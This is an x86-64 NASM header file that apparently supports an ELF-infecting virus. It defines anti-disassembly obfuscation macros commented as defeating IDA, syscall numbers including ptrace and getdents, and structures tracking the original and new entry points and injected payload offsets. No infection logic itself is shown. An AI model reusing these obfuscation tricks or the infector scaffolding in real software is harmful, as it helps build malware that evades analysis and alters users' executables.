%macro PUSHAQ 0
	push rbx
	push rcx
	push rdx
	push rdi
	push rsi
	push r8
	push r9
	push r10
	push r11
	push r12
	push r13
	push r14
	push r15
%endmacro
%macro POPAQ 0
	pop r15
	pop r14
	pop r13
	pop r12
	pop r11
	pop r10
	pop r9
	pop r8
	pop rsi
	pop rdi
	pop rdx
	pop rcx
	pop rbx
%endmacro


%macro OBF 0
	jmp short 0x2
	db 0x0f
%endmacro

%macro BIG_OBF 0 ;IDA cant handle
	push rax
	lea rax, [rel $]
	add rax, 14
	jmp rax
	db 0x0f
	pop rax
%endmacro

%macro BIG_OBF2 0 ;IDA cant handle
	push rax
	push rdi
	sub rsp, 8
	mov QWORD[rsp], 13
	pop rdi
	lea rax, [rel $]
	add rax, rdi
	jmp rax
	db 0x0f
	pop rdi
	pop rax
%endmacro

%macro SYS_NUM 1
	sub rsp, 8
	mov QWORD[rsp], %1
	pop rax
%endmacro

%define OPEN_DIR_PERMISSION		65536
%define OPEN_PROC_PERMISSION	0
%define MMAP_PROT				3
%define MAP_PRIVATE				2
%define MAP_ANONYMOUS			32
%define OPEN_FILE_PERMISSION	0

%define sys_read 0
%define sys_write 1
%define sys_open 2
%define sys_close 3
%define sys_lstat 6
%define sys_mmap 9
%define sys_munmap 11
%define sys_exit 60
%define sys_getdents 78
%define sys_ptrace 101

%define padding db 0x90
%macro print_nl 0
	push rcx
	push rax
	push rdi
	push rsi
	push rdx
	mov rax, 1
	mov rdi, 0
	mov rsi, new_line
	mov rdx, 1
	syscall
	padding
	pop rdx
	pop rsi
	pop rdi
	pop rax
	pop rcx
%endmacro

%define NAME_SIZE 512
%define CONTENT_SIZE 128
%define PAYLOAD_SIZE end - _start

%define DIRENT_SIZE 1024
struc	linux_dirent
	.d_ino			resq	1
	.d_off			resq	1
	.d_reclen		resw	1
	.d_name			resb	1
endstruc

%define TYPE_MASK		61440
%define DIRECTORY_MODE	16384
%define FILE_MODE		32768
%define STAT_STRUC_SIZE	144
struc stat
	.st_dev			resq 1
	.st_ino			resq 1
	.st_nlink		resq 1
	.st_mode		resd 1
	.st_uid			resd 1
	.st_gid			resd 1
	.pad0			resb 4
	.st_rdev		resq 1
	.st_size		resq 1
	.st_blksize		resq 1
	.st_blocks		resq 1
	.st_atime		resq 1
	.st_atime_nsec	resq 1
	.st_mtime		resq 1
	.st_mtime_nsec	resq 1
	.st_ctime		resq 1
	.st_ctime_nsec	resq 1
endstruc

%define EHDR_SIZE	64
struc ehdr
	.ei_mag			resd	1
	.ei_class		resb	1
	.ei_data		resb	1
	.ei_version		resd	1
	._pad0			resb	6
	.e_type			resw	1
	.e_machine		resw	1
	.e_version		resd	1
	.e_entry		resq	1
	.e_phoff		resq	1
	.e_shoff		resq	1
	.e_flags		resd	1
	.e_ehsize		resw	1
	.e_phentsize	resw	1
	.e_phnum		resw	1
	.e_shentsize	resw	1
	.e_shnum		resw	1
	.e_shstrndx		resw	1
endstruc

%define SHDR_SIZE	64
struc shdr
	.sh_name		resd	1
	.sh_type		resd	1
	.sh_flags		resq	1
	.sh_addr		resq	1
	.sh_offset		resq	1
	.sh_size		resq	1
	.sh_link		resd	1
	.sh_info		resd	1
	.sh_addralign	resq	1
	.sh_entsize		resq	1
endstruc

%define PHDR_SIZE	56
struc phdr
	.p_type			resd 1
	.p_flags		resd 1
	.p_offset		resq 1
	.p_vaddr		resq 1
	.p_paddr		resq 1
	.p_filesz		resq 1
	.p_memsz		resq 1
	.p_align		resq 1
endstruc

%define ELF_STRUC_SIZE 1024
struc elf_struc
	.stat				resb	STAT_STRUC_SIZE
	.path				resq	1
	.fd					resq	1
	.fd2				resq	1
	.ptr				resq	1
	.ptr_end			resq	1
	.ehdr				resq	1
	.old_entry			resq	1
	.new_entry			resq	1
	.bits_added			resq	1
	.bss_size			resq	1
	.data_shdr			resq	1
	.data_phdr			resq	1
	.shdr_names			resq	1
	.new_code_offset	resq	1
	.new_bin_addr		resq	1
endstruc